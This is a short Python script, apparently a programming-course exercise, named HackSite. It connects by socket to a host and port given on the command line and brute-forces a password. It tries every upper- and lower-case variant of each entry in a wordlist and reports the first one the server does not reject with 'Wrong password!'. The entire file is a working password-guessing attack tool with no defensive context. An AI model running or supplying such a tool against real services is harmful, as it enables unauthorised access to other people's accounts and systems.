import socket, sys
from itertools import product


class HackSite:
    def __init__(self):
        self.file_name = sys.argv[0]
        self.hostname = sys.argv[1]
        self.port = int(sys.argv[2])

    def visit_site(self):
        with socket.socket() as client_sock:
            client_sock.connect((self.hostname, self.port))

            def yield_variants(file):
                with open(file, 'r') as pw_list:
                    for pw in pw_list:
                        for variation in map(''.join, product(*(sorted({c.upper(), c.lower()}) for c in pw))):
                            yield variation

            variants = yield_variants('passwords.txt')

            while True:
                try:
                    temp_pw = next(variants)
                except StopIteration:
                    print('All passwords have been attempted!')
                    break

                client_sock.send(temp_pw.encode())
                temp_response = client_sock.recv(1024)

                if temp_response != b'Wrong password!':
                    print(temp_pw)
                    break


program = HackSite()
program.visit_site()
